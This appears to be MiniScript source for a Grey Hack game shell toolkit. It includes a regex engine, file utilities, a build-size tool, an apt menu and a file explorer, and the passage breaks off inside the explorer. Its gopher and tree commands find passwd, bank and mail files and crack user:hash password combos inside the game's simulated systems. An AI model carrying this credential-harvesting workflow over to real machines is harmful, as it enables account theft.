if DEBUG then print("<size=75%>loading dtools.5pk...(62.957kb)</size>")
re = {}
re.match = function(regexp, text) // expects character arrays
	if DEBUG then print("<b> in globals.re(gex)")
  if regexp[0] == "^" then
		regexp.pull
		return re.match_here(regexp,text)
	end if
  while text.len > 0
    if re.match_here(regexp, text) then return 1

		text.pull
  end while
  return 0
end function
re.match_here = function(regexp, text)
  if not regexp then return 1
  if regexp.len > 1 and regexp[1] == "*" then
		//return self.match_star(regexp[0], regexp[2:], text)
		char = regexp.pull
		regexp.pull
		return re.match_star(char, regexp, text)
	end if
  if regexp[0] == "$" and not regexp.hasIndex(1) then
    if text.hasIndex(1) then return 0 else return 1
  end if
  if text.len > 0 and (regexp[0] == "." or regexp[0] == text[0]) then
		//return self.match_here(regexp[1:], text[1:])
		regexp.pull
		text.pull
		return re.match_here(regexp,text)
	end if
  return 0
end function
// re.match_star needs work. misses certain cases.
re.match_star = function(c, regexp, text)
  while text.len and (text[0] == c or c == ".")
    if re.match_here( regexp, text) then return 1
    //text = text[1:]
		text.pull
  end while
  return 0
end function
if DEBUG then print("<size=75%>loaded regex engine...</size>")
command.poke = function(arg1, arg2, arg3=0, arg4=0)
	if arg1 == 0 or arg1 == "-h" or arg1 == "help" then return "<u>touch || poke || makefile || overwrite</u>"+char(10)+"Usage: poke [/path/to/file] [opt: string] -- create file in path and optionally set contents to string."+char(10)+"Usage: poke test.txt -- creates text.txt in the current path"+char(10)+"poke test.txt hello -- creates test.txt and sets content to hello"+char(10)+"Advanced: ls -la /virt | poke test.txt -- creates test.txt and pipes the output of ls -la /virt into it"+char(10)+"N.B. if file already exists then contents will be <b>overwritten</b> if string supplied."+char(10)+"n.b.b. if string is more than one word use piping to supply string."+char(10)+"Advanced: poke -n [path] -- create path and/or set content to null."+char(10)+"-- overwrites file content with a null character."
  if arg1 == "-n" then
    if not arg2 then return "poke: -n option requires a valid path to a file."
    arg1 = arg2
    arg2 = "!!nullify!!23tqg43qg34g!!"
  end if
  destination = null
  final_name = null
  dest = globals.get_file(arg1)
  if not dest then
    split = arg1.split("/")
    final_name = split.pop
		if DEBUG then print("split: "+split)
    if split.len and split[0] == "" then dest = globals.get_file(split.join("/")) else dest = globals.get_file(split.join("/"))
		if DEBUG then print("dest: ["+dest+"]")
		if not dest then
      if arg1[0] == "/" then destination = "/" else destination = currentPath
    else
      destination = dest.path
    end if
  else
    if dest.is_folder then
      return "poke: "+arg1+" is a folder."
    else
      destination = dest.parent.path
      final_name = dest.name
    end if
  end if

	dest_folder = globals.get_file(destination)
	if not dest_folder then return("poke: " + dest_path + " not found")
	if not dest_folder.has_permission("w") then return("poke: permission denied")
	try = localmachine.touch(dest_folder.path, final_name)
	if try != 1 then
		print("poke: "+try)
		if arg2 then
			if try == "The file already exists" and user_input("overwrite contents? [Y/n] ||: ",0,1).lower == "n" then
				return "aborting..."
			end if
		end if
	end if
  dest_name = ""
	if dest_folder.path != "/" then dest_name = "/"+final_name else dest_name = final_name
	output = localmachine.File(dest_folder.path+dest_name)
	if not output then return "poke: write error"
	if arg2 and output.has_permission("w") then
    if arg2 == "!!nullify!!23tqg43qg34g!!" then arg2 = ""
    if output.is_binary then
      return "poke: can't poke a binary file."
    else
      output.set_content(arg2)
    end if
  else
    if arg2 then return "poke: permission denied."
  end if
	return output
end function
command.merge = function(arg1, arg2, arg3=0, arg4=0)
	if not arg1 or not arg2 or arg1 == "help" or arg1 == "-h" then return "Usage: merge file_path_1 file_path_2 --  combine files. file_1 will have file_2 appended to it."
	file1 = localmachine.File(arg1)
	file2 = localmachine.File(arg2)
	if file1 and file2 then
		catch = file1.set_content( file1.get_content.trim + file2.get_content.trim )
	else
		return("Check path(s) and try again.")
	end if
	return catch
end function
command.append = function(arg1, arg2, arg3=0, arg4=0)
	if arg1 == 0 or arg1 == "-h" or arg1 == "help" then return "Usage: append [path_to_file] [text] (works best with pipe) --  add text to end of file."+char(10)+"Usage: append @clipa|b|c [text] -- append to the end of a clip space."+char(10)+"N.B.<b> @clipa and @clipc will append text directly with no new line. </b>"+char(10)+" -- @clipb will add a new line and then append text."
	path_to_file = arg1
	buf = arg2
	if path_to_file == "@clipa" then
		globals.clip_board_alpha = globals.clip_board_alpha+buf
		return "clipped:"+char(10)+globals.clip_board_alpha
	end if
	if path_to_file == "@clipb" then
		globals.clip_board_beta = globals.clip_board_beta+char(10)+buf
		return "clipped:"+char(10)+globals.clip_board_beta
	end if
	if path_to_file == "@clipc" then
		globals.clip_board_gamma = globals.clip_board_gamma+buf
		return "clipped:"+char(10)+globals.clip_board_gamma
	end if
	file = localmachine.File(path_to_file)
	if not file then file = localmachine.File(currentPath+"/"+path_to_file)
	if not file then file = localmachine.File(currentPath+path_to_file)
	if not file then return "404: file not found"
	if file.get_content == "" then return file.set_content(buf)
	return file.set_content(file.get_content+char(10)+buf)
end function
command.dfit = function(arg1, arg2, arg3=0, arg4=0)
	if arg1 == "-h" or arg1 == "help" then return "Usage: dfit [path_to_file]"+char(10)+"Takes text file and splits contents by newline, joins by comma and outputs to a.csv by default."+char(10)+"As the name suggests, this is for making dictionary files. Output is a csv (comma separated values) file."
	df = null
	if arg1 then
		df = arg1
	else
		return "Usage: dfit [path_to_file]"
	end if
	dump = localmachine.File(currentPath+"/"+df)
	if not dump then
		dump = localmachine.File(df)
		if not dump then return(df+" not found.")
	end if
	P_LIST = []
	outFileName = user_input("Enter outfile name or leave blank for a.csv: "+char(10))
	if outFileName == "" or outFileName == " " then outFileName = "a.csv"
	print("Scanning...")
	lines = dump.get_content.split(char(10))
	print("Found "+lines.len+" lines. Sorting... ")
	for pw in lines
		if pw == "" then continue
		P_LIST.push(pw.trim)
	end for
	get_shell.host_computer.touch(currentPath,outFileName)
	outfile = get_shell.host_computer.File(currentPath+"/"+outFileName)
	if not outfile then return "Error: check write permissions"
	outfile.set_content(P_LIST.join(","))
	return (char(10)+"File "+outFileName+" saved. ")
end function
command.chop = function(arg1, arg2=0, arg3=0, arg4=0)
	if not arg1 or arg1 == "help" or arg1 == "-h" then return "chop [path_to_file] [index -- default 0] [delimiter -- default (char(32) aka 'a space' )] "+char(10)+"Prompts for output name. Outputs to current path with newline separated index values. "+char(10)+"e.g:<b> rnip 11 | porter 22 | poke test.txt | lock |  | clipb | append test.txt | chop test.txt 0 : | enum test.chop | enum -s </b> (assumes output file named test.chop)"+char(10)+"AdvanceD: chop @clipa/b/c [index] [delimiter] -- run chop on clip space instead of a file. Supports outputting to clip space as well."
	file = null
	clipping = false
	if typeof(arg1) == "string" then
		if arg1 == "@clipa" or arg1 == "@clipb" or arg1 == "@clipc" then
			clipping = true
		else
			file = globals.get_file(arg1)
			if not file then return "404: file not found"
		end if
	else
		return "chop: arg1 must be string: /path or string: @clipa/b/c"+char(10)+"clipa/b/c contents must be string."
	end if
	new_name = user_input("Enter output file name or press <<b>return</b>> for: "+arg1.remove("@")+".chop "+char(10)+"Enter @clipa or @clipb or @clipc to send output to clip space."+char(10)+":> ",0,0)
	if new_name == "" then new_name = arg1.remove("@")+".chop"
	new_file = null
	if new_name == "@clipa" or new_name == "@clipb" or new_name == "@clipc" then
		new_file = new_name
	else
		localmachine.touch(currentPath, new_name)
		new_file = globals.get_file(new_name)
		if not new_file then return "chop: could not write output file. access denied. check write permissions or path and try again."
	end if
	if clipping == true then
		if arg1 == "@clipa" then
			if typeof(globals.clip_board_alpha) == "string" then data = globals.clip_board_alpha.replace(char(160),char(32)).split(char(10)) else return "chop: clipa contents incompatible. expects string."
		end if
		if arg1 == "@clipb" then
		  if typeof(globals.clip_board_beta) == "string" then data = globals.clip_board_beta.replace(char(160),char(32)).split(char(10)) else return "chop: clipb contents incompatible. expects string."
		end if
		if arg1 == "@clipc" then
			if typeof(globals.clip_board_gamma) == "string" then data = globals.clip_board_gamma.replace(char(160),char(32)).split(char(10)) else return "chop: clipc contents incompatible. expects string."
		end if
	else
		data = file.get_content.replace(char(160),char(32)).split(char(10))
	end if
	out = []
	del = char(32)
	if arg3 then del = arg3
	//print("del: "+del)
	inde = 0
	if arg2 then inde = arg2.to_int
	if typeof(inde) != "number" then inde = 0
	for line in data
		if line == "" then continue
		//print("Chopping "+line)
		l_split = str(line).split(del)
    i = 0
    fix = []
    for c in l_split
      if c != "" then fix.push(l_split[i])
      i = i + 1
    end for
		//print(fix)
		if fix.hasIndex(inde) then out.push(fix[inde])
	end for
	if typeof(new_file) == "file" then
		//print("error: "+new_file)
		new_file.set_content(out.join(char(10)))
		return new_file.get_content
	else
		if new_file == "@clipa" then return command.clipa(out.join(char(10)))
		if new_file == "@clipb" then return command.clipb(out.join(char(10)))
		if new_file == "@clipc" then return command.clipc(out.join(char(10)))
	end if
end function
command.gopher = function(arg1, arg2, arg3=0, arg4=0) // requires crypto.so
	if not arg1 or arg1 == "help" or arg1 == "-h" then return "Usage: gopher [/path/file|file_object] -- decipher user:hash combo(s) in file. outputs to /current_path/dump.txt"+char(10)+"Uses onboard dictionary by default then crypto.decipher if not found."+char(10)+"Example:<b> poke pass root:1f3870be274f6c49b3e31a0c6728957f | gopher</b>"+char(10)+" -- writes the root:hash combo to pass in current path and pipes output file to gopher for deciphering."+char(10)+"-- see cerebrum and hashim for additional options."+char(10)+"Usage: gopher [/path/to/file] --  decrypt file contents"+char(10)+"Advanced: tree / Bank.txt 0 Y -- automatically decipher Bank.txt, no piping required (tree calls gopher)."+char(10)+"n.b. the <b>tree</b> command, typed without args, will prompt to call gopher on passwd, bank and mail files if found."
	if not globals.crypto then return "Crypto: not found"
	if typeof(arg1) == "file" then
		file = arg1
	else
		file = globals.get_file(arg1)
	end if
	catch = "gopher: "+arg1+"not found or invalid."
	if arg1 then catch = globals.Gopher(file)
	return catch
end function
command.grep = function(a1, a2, arg3=0, arg4=0)
	if not a1 or not a2 or a1 == "-h" or a1 == "help" then return "Usage: grep [string] [file/folder]"+char(10)+"Advanced: grep [string] [object] -- search piped object (shell|file|computer) for string. "+char(10)+"-- piped computer and shell objects will be searched from / directory."+char(10)+"-- piping a file object searches from path of file."+char(10)+"n.b. supports partial matches and limited regular expressions."+char(10)+"<u>current regex tokens (more planned):</u>"+char(10)+"c   matches any literal character 'c'"+char(10)+"-- bob matches bob anywhere in the text."+char(10)+"^   match pattern from beginning of word"+char(10)+"-- ^ber matches bertha  does not match robert"+char(10)+"$   match end of line (goes at end of pattern)"+char(10)+"-- .txt$ matches file.txt does not match file.txt.src"+char(10)+"*   matches one or more of preceding character"+char(10)+"-- c* matches c, cc, ccc, cccc "+char(10)+".   matches any unicode char (wildcard)"+char(10)+"-- .*:.*  matches root:password, email@domain.com:password, xyz:1234"+char(10)+"Important! Runtime depends on length of pattern and size of text to check. Since grep will recurse any folders in a given path, this command could result in very long run times. It is up to you to limit the scope of your searches accordingly."
	gresult = []
	gp = function(grep_tar, t_f, use_re)
		if t_f.is_folder and t_f.is_binary then
			sub_folders = t_f.get_folders
			sub_files = t_f.get_files
			g_buf = null
			for sub in sub_folders
				if use_re == true then
					if re.match(grep_tar.values, sub.name.values) then gresult.push(colorLightBlue+"Found folder: "+CT+colorOrange+sub.name+CT+colorLightBlue+" in: "+ sub.parent.path + CT)
				else
					if sub.name == grep_tar or sub.name.indexOf(grep_tar) then gresult.push(colorLightBlue+"Found folder: "+CT+colorOrange+sub.name+CT+colorLightBlue+" in: "+ sub.parent.path + CT)
				end if
				gp(grep_tar, sub, use_re)
			end for
			for f in sub_files
				if use_re == true then
					if re.match(grep_tar.values, f.name.values) then gresult.push(colorLightBlue+"Found file: "+CT+colorOrange+f.name+CT+colorLightBlue+" in: "+ f.parent.path + CT)
				else
					if f.name == grep_tar or f.name.indexOf(grep_tar) >= 0 then gresult.push(colorLightBlue+"Found file: "+CT+colorOrange+f.name+CT+colorLightBlue+" in: "+ f.parent.path + CT)
				end if
				gp(grep_tar, f, use_re)
			end for
		end if
		if t_f.is_binary then return
		buf = t_f.get_content
		if buf == "" or buf == null then return
		lines = buf.split(char(10))
		for line in lines
			words = line.split(" ")
			for word in words
				if use_re == true then
					if re.match(grep_tar.values, word.values) then gresult.push(colorLightBlue+"Found: "+CT+colorWhite+word+CT+colorLightBlue+" on line "+lines.indexOf(line)+" word "+words.indexOf(word)+" in file: "+ t_f.path + CT)
				else
					if word == grep_tar or word.indexOf(grep_tar) >= 0 then gresult.push(colorLightBlue+"Found: "+CT+colorWhite+word+CT+colorLightBlue+" on line "+lines.indexOf(line)+" word "+words.indexOf(word)+" in file: "+ t_f.path + CT)
				end if
			end for
		end for
	end function
	output = "No "+a1+" found."
	t_f = null // target file or folder
	grep_tar = a1.trim
	invoke_regex = false
	special_chars = ["*","^","$","."]
	for special in special_chars
		if grep_tar.indexOf(special) >= 0 then invoke_regex = true
	end for
	tf_path = a2
	if typeof(tf_path) == "string" then
		t_f = globals.get_file(tf_path)
		if not t_f then return "grep: "+a2+" not found."
	end if
	// piped object handling. Unused if run as standalone but if baked into your own script, pipe objects to grep them.
	if typeof(tf_path) == "file" then t_f = tf_path
	if typeof(tf_path) == "computer" then t_f = tf_path.File("/")
	if typeof(tf_path) == "shell" then t_f = tf_path.host_computer.File("/")
	if typeof(t_f) != "file" then return "grep: "+a2+": unkown type."
	// end piped object handling.
	gp(grep_tar, t_f, invoke_regex)
	if gresult != [] then output = gresult.join(char(10))
	return output
end function
command.tree = function(arg1, arg2=0, arg3=0, arg4=0)
	if arg1 == "-h" or arg1 == "help" then return "Usage: tree -- view filesystem tree (from / if no argument)"+char(10)+"Usage: <b>tree [path]</b> -- view filesystem from path down"+char(10)+"Usage: tree [opt: path] [opt: grep_target] [bool: 1/0] [opt: R|Y|N]"+char(10)+"-- [path] - path to descend"+char(10)+"-- [grep_target] - search for traget file by name"+char(10)+"<b>-- Returns a file object if grep_target and grep is successful.</b>"+char(10)+"-- [1|0] -  1 = quiet, supress output"+char(10)+"-- [1|0] - 0 = verbose, print output"+char(10)+"-- [r|n|y] - r = to tbuf, n = skip, y = decipher in place (default is <b>R</b>)"+char(10)+"-- see command.clipa|b|c for more (ie <b>clipb -h</b>)"+char(10)+"Advanced: tree @clipa/b/c [grep] [1|0] [r|y|n] -- tree from object in [clipa/b/c] [optional grep] [quiet_mode] [rmote|yes|no]"+char(10)+"e.g. -<b> tree / database.csv 1 N | file -b</b> -- find database.csv on filesystem, display properties and send to BUFFER (if database.csv exists)."+char(10)+"N.B. You may use @a, @b, @c in place of @clipa, @clipb, @clipc if you prefer."+char(10)+"<b>Function returns a file if grep is successful.</b>"
	tem = null
	if arg1 then
		if arg1 == "@clipa" or arg1 == "@a" then arg1 = globals.clip_board_alpha
		if arg1 == "@clipb"  or arg1 == "@b" then arg1 = globals.clip_board_beta
		if arg1 == "@clipc"  or arg1 == "@c" then arg1 = globals.clip_board_gamma
		if typeof(arg1) == "string" then tem = localmachine.File(arg1)
		if typeof(arg1) == "shell" or typeof(arg1) == "ftpshell" then tem = arg1.host_computer.File("/")
		if typeof(arg1) == "computer" then tem = arg1.File("/")
		if typeof(arg1) == "file" then
			while arg1.name != "/"
				arg1 = arg1.parent
			end while
			tem = arg1
		end if
	else
		tem = localmachine.File("/")
	end if
	if arg3 == "0" then arg3 = 0
	globals.grepped_file = null
	if tem then globals.list_files(tem, arg2, arg3, arg4)
	if arg2 and globals.grepped_file and globals.grepped_file.name == arg2 then return globals.grepped_file
	return 0
end function
command.makfit = function(arg1, arg2, arg3=0, arg4=0)
	if not arg1 or not arg2 or arg1 == "help" or arg1 == "-h" then return "Make it fit file compression tool by Plu70"+char(10)+"Usage: makfit [/path/to/file.src] [target_size_in_bytes] [optional: -A --include uppercase]"+char(10)+"Builds to size and outputs to parent path of .src file."+char(10)+"Extra: makfit [-n] [target_size_in_bytes] [opt:-A] -- no_source file || no_source file optional: use caps."+char(10)+"-- this allows you to find a filename without supplying a source file."+char(10)+"Note: when successful makfit will return the compressed file object."
	no_source = false
	source = "print(""Hellow World"")"
	time_start = time
	source_path = arg1
	SIZE = arg2.to_int
	if DEBUG then print("current path: "+ currentPath)
	out_path = currentPath
	out_file = null
	source_file = null
	temp_path = currentPath
	if source_path.lower != "-n" then 
		source_file = globals.get_file(source_path)
		if not source_file then return "makfit: could not find file: "+source_path
		if source_file.is_binary then return "makfit: expected text file, got binary."
		temp_path = source_file.parent.path	
		if source_file.has_permission("r") then source = source_file.get_content else return "makfit: cannot read source file. Permission denied."
		if DEBUG then print("Read: "+source.len+" bytes from source file.")
	end if
	og_name = arg1
	if typeof(source_file) == "file" then og_name = source_file.name
	if og_name == "-n" then
		no_source = true
		og_name = "probe.src"
		if currentPath != "/" then source_path = currentPath+"/"+og_name else source_path = og_name
		print("makfit: running in sourceless mode"+char(10)+"Creating dummy file: probe.src")
	 	command.poke(source_path)
		print("Securing system.")
		command.perms("lock","all")
	end if
	print(colorLightBlue+"Building "+CT+colorWhite+ og_name +CT+colorLightBlue+" to file size <= " +CT+colorWhite+ SIZE +CT+colorLightBlue+" bytes. "+CT)
	og_name = og_name.split(".")[0]
	if DEBUG then print("og_name: "+og_name)
	print("<align=center>"+char(3675)+"</align>")
	last_size = (SIZE + 1000)
	last_name = ""
	new_name = function(int)
		nm = []
		r = range("a".code,"z".code)
		if arg3 == "-A" then
			R = range("A".code, "Z".code) // it is somehow faster (for me) with this commented out. ymmv
			r = r + R											// i get about 45 sec avg with lowercase and 100 sec avg with upper+lower
		end if
		for loop in range(0, int)
			r.shuffle
			nm.push(char(r[0]))
		end for
		nm.push(".")
		r.shuffle
		nm.push(r[0])
		nm = nm.join("")
		return nm
	end function
	//
	i = 0
	l = 1
	while last_size > SIZE
		i = i + 1
		if i >= 50 then
			l = l + 1
			i = 1
		end if
		n = new_name(l)
		catch = localmachine.touch(temp_path, n+".src") // create the temp source file
		if DEBUG then print("attempted to create "+temp_path+ " + "+ n +".src"+char(10)+"Result: "+catch)
		if catch == "Can't compile. Source code is empty" then return catch
		out_path = temp_path+n
		if temp_path != "/" then out_path = temp_path+"/"+n
		if DEBUG then print("out_path: "+out_path)
		temp = globals.get_file(out_path+".src")
		if not temp then return "makfit: error could not create tempfile"
		temp.set_content(source)                      // set it's content with the original source
		catch = shell.build(temp.path, temp_path)     // build it
		if DEBUG then print("attempted to build "+temp.path+char(10)+"Result: "+catch)
		//wait(1)
		out_file = null
		out_file = globals.get_file(out_path)
		if not out_file then return("makfit: error: "+out_path+" not found. build failed."+CT)
		last_size = out_file.size.to_int    // check it's size
		if out_file.size.to_int > SIZE then
			out_file.delete
			temp.delete
		end if
	end while
	//
	time_end = time
	print(colorLightBlue+"Compiled "+colorWhite+out_file.name+colorLightBlue+" to size: "+colorWhite+out_file.size+colorLightBlue+" bytes."+CT)
	print(colorLightBlue+"Process completed in "+colorOrange+ (time_end - time_start) +colorLightBlue+ " seconds."+CT)
	if arg1 != "-n" then
		print(colorLightBlue+out_file.path+" renamed to: ")
		re_name = ""
		if temp_path != "/" then temp_path = temp_path + "/"
		command.mv(out_file.path,temp_path+og_name)
		print(colorLightBlue+out_file.path)
	end if
	print("Securing system.")
	command.perms("lock","all")
	return out_file
end function
command.make = function(arg1, arg2, arg3=0, arg4=0)
	if arg1 == "help" or arg1 == "-h" or arg1 == 0 or arg2 == 0 then return "Usage: make [/path/file.src] [/path/destination_folder] -- build the .src file and ouput to destination folder."+char(10)+"-- final file name will be input file name with .src stripped."+char(10)+"e.g.<b> make /root/src/5hell.src /bin </b>-- build 5hell.src into a binary and output to:<b> /bin/5hell</b>"+char(10)+"n.b. make requires the source file have the .src extension."
	pathSource = arg1
	programPath = arg2
	fileSource = globals.get_file(pathSource)
	folderDest = globals.get_file(programPath)
	if not fileSource then return("build: can't find "+ pathSource)
	if not folderDest then return("build: can't find " + folderDest)
	output = shell.build(fileSource.path, folderDest.path)
	if output.len == 0 then
		return("build successful.")
	else
		return(output)
	end if
	return 0
end function
command.aptm = function(arg1, arg2, arg3=0, arg4=0) // requires aptclient.so
	if arg1 == "-h" or arg1 == "help" then return "aptm: apt-get menu -- manage apt functions, add/remove/search repositories."+char(10)+"Advanced: [7] hot_swap_libs -- reload meta/crypto/apt to use latest versions after updating."
  if not globals.apt_get then return colorRed+"Error:aptclient.so not found in /lib or current_path"+CT
  if GLASSPOOL then print(colorOrange+"Ignores Glasspool."+CT)
	// apt menu by Plu70
	apt = {}
	apt.exit = function()
		return 0
	end function
	apt.check_upgrade = function()
    chk_upg = function(check)
      if apt_get.check_upgrade(check) then
        sp = check.split("/")
        nm = sp.pop
        if sp != [] then
					print("__")
          apt_get.install(nm, sp.join("/"))
        else
					print("__")
          apt_get.install(nm)
        end if
        return "apt-get: "+check+" upgrade complete"
      else
        return "apt-get: "+check+" no upgrades found"
      end if
    end function
	  cup = user_input("upgrade file_name or /path"+char(10)+":> ")
    if not cup or cup == "" or cup == " " then return
    f = get_shell.host_computer.File(cup)
    if f and f.is_folder then
      files = f.get_files
			print("Checking: "+f.path+char(10)+"Found: "+files.len+" files.")
      for sub in files
        print(chk_upg(sub.path))
      end for
      return "Batch complete."
    end if
    return chk_upg(cup)
	end function
	apt.add_repo = function()
	  return apt_get.add_repo(user_input("add repo ip:> "))
	end function
	apt.del_repo = function()
		apt.update
	  return apt_get.del_repo(user_input("del repo ip:> "))
	end function
	apt.install = function()
	  return apt_get.install( user_input("install:> "), user_input("directory:> ") )
	end function
	apt.search = function()
		apt.update
	  return apt_get.search(user_input("search:> "))
	end function
	apt.show = function()
		apt.update
		print("_____________________________________________"+char(10))
		rb = apt_get.show(user_input("show repo:> "))
	  return char(10)+rb
	end function
	apt.hot_swap = function()
		hot_swap_libs
		return "Libraries hot_swapped."
	end function
	apt.update = function()
	  return apt_get.update
	end function
	apting = true
	while apting
	  apt.update
	  i = 0
	  for c in apt.indexes
		 print("["+colorWhite+i+CT+"] - apt-get."+"<b>"+c+"</b>")
	    i = i + 1
	  end for
	  //print("["+colorWhite+i+CT+"] - Exit")
		a_choice = user_input("(q=quit)||: ",0,1).to_int
	  if a_choice == 0 or a_choice == "q" then return 0
	  if typeof(a_choice) != "number" or a_choice >= i or a_choice < 0 then continue
	  print(apt.indexes[a_choice])
	  catch = apt[apt.indexes[a_choice]]
	  print(catch)
	  print("_____________________________________________")
	  print
	end while
	return 0
end function
// felix file explorer by, Plu70
if DEBUG then print("<size=75%>loading felix.5pk...(13.691kb)</size>")
command.felix = function(arg1, arg2=0, arg3=0, arg4=0)
  if arg1 == "help" or arg1 == "-h" then return "Usage: felix -- file explorer v 0.2, (wip). Use arrow keys to navigate. Press / to manually type a path."+char(10)+"Advanced: felix [shell|computer|file] -- run felix on filesys of piped object."+char(10)+"e.g. clipb @B 1 | felix -- where BUFFER[1] contained a file, shell or computer."
  action = {}
  action.cursor = 0
  action.last = 0
  min = 0
  action.max = 0

  action.memory = null
  action.buffer = function(arg=null)
    if arg then action.memory = arg
    if not action.memory then return char(176)
    return action.memory.name
  end function
  action.b = function(inf)
    selected = action.get_selected(inf)
    if not selected then return inf
    globals.BUFFER.push(selected)
    conf = user_input("felix:<b> sent "+selected.name+" to BUFFER. Acces via memory_alpha.</b>"+char(10)+"press <<b>anyKey</b>> to continue",0,1)
    return inf
  end function
  action.get_selected = function(infile)
    folders = infile.get_folders
    files = infile.get_files
    contents = folders + files
    if contents.len == 0 then return 0
    if contents.hasIndex(action.cursor) then return contents[action.cursor] else return 0
  end function
  action.r = function(inf) //  remove
    selected = action.get_selected(inf)
    if not selected then return inf
    confirm = user_input("<b>delete</b> "+selected.path+"? [y/N] ||: ",0,1)
    if confirm.lower == "y" or confirm == "RightArrow" then
      check = selected.delete
      if check then print(check) else print("...deleted.")
    else
      print("aborting...")
    end if
    return inf
  end function
  action.z = function(f)
    if action.memory then action.memory = null
    return f
  end function
  action.x = function(inf)
    nf = action.get_selected(inf)
    if nf then action.buffer(nf)
    return inf
  end function
  action.v = function(inf)
    selected = action.get_selected(inf)
    if not selected then return inf
    if not action.memory then return inf
    dest = inf.path
    label = ""
    print("[0] abort "+char(10)+"[1] overwrite "+selected.name+char(10)+"[2] paste to "+inf.path)
    if selected.is_folder then print("[3] paste to "+selected.path)
    opt = user_input("(q=quit)||: ",0,1)
    if opt == "0" or opt.lower == "q" then return inf
    coop = user_input("[<b>0</b>] - Copy or [1] - Move (q=quit)||: ",0,1)
    if coop.lower == "q" then return inf
    if opt == "3" and selected.is_folder then
      dest = selected.path
      label = action.memory.name
      if coop.to_int == 1 then
        action.memory.move(dest, label)
      else
        action.memory.copy(dest, label)
      end if
      return inf
    end if
    if opt == "1" then
      label = selected.name
    else
      if opt == "2" then
        label = action.memory.name
      else
        return inf
      end if
    end if
    if coop.to_int == 1 then
      action.memory.move(dest, label)
    else
      action.memory.copy(dest, label)
    end if
    //action.memory = null
    return inf
  end function
  action.e = function(f)
    // poke, mkdir, rename
    return f
  end function
  action.f = function(inf)
    selected = action.get_selected(inf)
    if not selected then return inf
    print(command.file(selected))
    print(colorGreen+"<u>==================================</u>"+CT)
    wait_for = user_input("press <<b>anyKey</b>> to continue",0,1)
    return inf
  end function
  action.n = function(inf)
    selected = action.get_selected(inf)
    if not selected then return inf
    new_name = user_input("rename_"+selected.name+"(null=abort):> ")
    if new_name == "" or new_name == " " then return inf
    print(selected.rename(new_name))
    return inf
  end function
  action.d = function(inf)
    return action.RightArrow(inf)
  end function
  action.RightArrow = function(inf)
    selected = action.get_selected(inf)
    if not selected then return inf
    if selected.is_folder then // descend into folder
      inf = selected
      action.last = abs(action.cursor)
      action.cursor = 0
      return inf
    end if
    if selected.is_binary then // run prompt
      if selected.name.split(".")[-1] != "so" then
        doit = user_input("launch "+selected.name+"? [y/N] "+char(10)+"||: ",0,1).lower
        if doit == "y" or doit == "RightArrow" then
          if typeof(shell) == "ftpshell" then
            print("launch not available in ftpshell")
            return inf
          end if
          try = shell.launch(selected.path, user_input("params for: "+char(10)+selected.path+" "))
          globals.stack_pool = globals.stack_pool - 1
          if try then print(try)
        end if
        return inf
      else
        if selected.path.split("/")[1] == "lib" then
          if user_input("database this lib.so? [y/N] ||:",0,1).lower == "y" then
            if globals.metaxploit then command.db("-l", selected.name)
          end if
          return inf
        else
          print(colorOrange+"Selected .so is not in /lib "+CT+char(10)+"aborting... ")
          return inf
        end if
      end if
    end if
    if selected.has_permission("r") then
      print(selected.get_content)
      pause = user_input(char(10)+"press <<b>anyKey</b>> to continue",0,1)
    end if
    return inf
  end function

  action.a = function(f)
    return action.LeftArrow(f)
  end function
  action.LeftArrow = function(f)
    if f.name != "/" then
      f = f.parent
      action.cursor = abs(action.last)
    end if
    return f
  end function

  action.w = function(f)
    return action.UpArrow(f)
  end function
  action.UpArrow = function(f)
    if action.cursor <= min then
      action.cursor = action.max
      return f
    end if
    action.cursor = action.cursor - 1
    return f
  end function

  action.s = function(f)
    return action.DownArrow(f)
  end function
  action.DownArrow = function(f)
    if action.cursor >= action.max then
      action.cursor = min
      return f
    end if
    action.cursor = action.cursor + 1
    return f
  end function

  action.f1 = function(f)
    print("-----")
    print("Navigation: [w][a][s][d] or ArrowKeys ")
    print("            [d] - rightArrow to: launch bin, open text, scan .so, descend dir")
    print("Manual  cd: [/] - type path stating with / ")
    print("               -- the [/] initiates manual entry ")
    print("Select:     [x] - selection buffer; sets item to copy from ")
    print("Paste:      [v] - performs a paste using selection buffer ")
    print("               -- to highlighted selection (opens context menu) ")
    print("Remove:     [r] - deletes file ")
    print("Unselect:   [z] - remove item from selection buffer ")
    print("Clr_scrn:   [c] - toggle clear screen or regular view ")
    print("File info:  [f] - get file info/properties for highlighted selection ")
    print("Buffit:     [b] - send highlighted selection to BUFFER ")
    print("Rename:     [n] - rename highlighted selection ")

    print("_____note: launching binaries via felix does NOT activate glasspool_____")
    print("-----")
    pause = user_input("press <<b>anyKey</b>> to continue",0,1)
    return f
  end function

  action.get = function(arg, afile)
    arg = arg.trim
    if arg != "DownArrow" and arg != "UpArrow" and arg != "LeftArrow" and arg != "RightArrow" then arg = arg.lower
    //print(arg)
    if action.hasIndex(arg) then
      a = @action[arg]
      return a(afile)
    else
      return afile
    end if
  end function

  action.branch = function(f, arg) // takes a file object
    file_object = f
    f_path = arg.split("/")
    if f_path[0] == "" then f_path[0] = "/"
    while file_object.name != "/"
      file_object = file_object.parent
    end while
    print("f_path: "+f_path) // debug
    print("arg: "+arg)       // debug
    while file_object.path != arg.trim
      globals.grepped_file = null
      globals.list_files(file_object, f_path.pull, 1,"N") // requires 5hell or 5hell.so
      if globals.grepped_file then file_object = globals.grepped_file else return f
    end while
    return file_object
  end function

  path_contents = function(f)
    folders = f.get_folders
    files = f.get_files
    contents = folders + files
    action.max = contents.len - 1
    output = f.permissions+" "+f.owner+" "+f.group+" "+f.size+" "+char(1068)+"["+f.is_binary+"] "+f.path + char(10) + char(166) + " [ " + action.buffer + " ]"
    i = 0
    get = ""
    c_put = ""
    for c in contents
      c_put = c.permissions+" "+c.owner+" "+c.group+" "+c.size+" "+char(1068)+"["+c.is_binary+"] "+c.name
      output = output+char(10)+c_put
      if i == action.cursor then
        get = c.name
        if get == null then get = ""
      end if
      i = i + 1
    end for
    if get then print( format_columns(output).replace(get,colorOrange+get+CT).replace(".src",colorCyan+".src"+CT).replace(".exe",colorRed+".exe"+CT).replace(".txt",colorWhite+".txt"+CT).replace(".log",colorLightBlue+".log"+CT).replace(".jpg",colorLightBlue+"</b>.jpg</color>").replace(".so",colorGold+"</b>.so</color>").replace(".html",colorCyan+".html"+CT) ) else print(format_columns(output))
    return
  end function

  ////BEGIN MAINish
  felix = function(file)
    currentPath = file.path
    contents = file.get_folders + file.get_files
    action.max = contents.len - 1
    CLEAR = -1
    while true
      if CLEAR > 0 then
        clear_screen
        button_c = "<b>C</b>"
      else
        button_c = "<b>c</b>"
      end if
      path_contents(file)
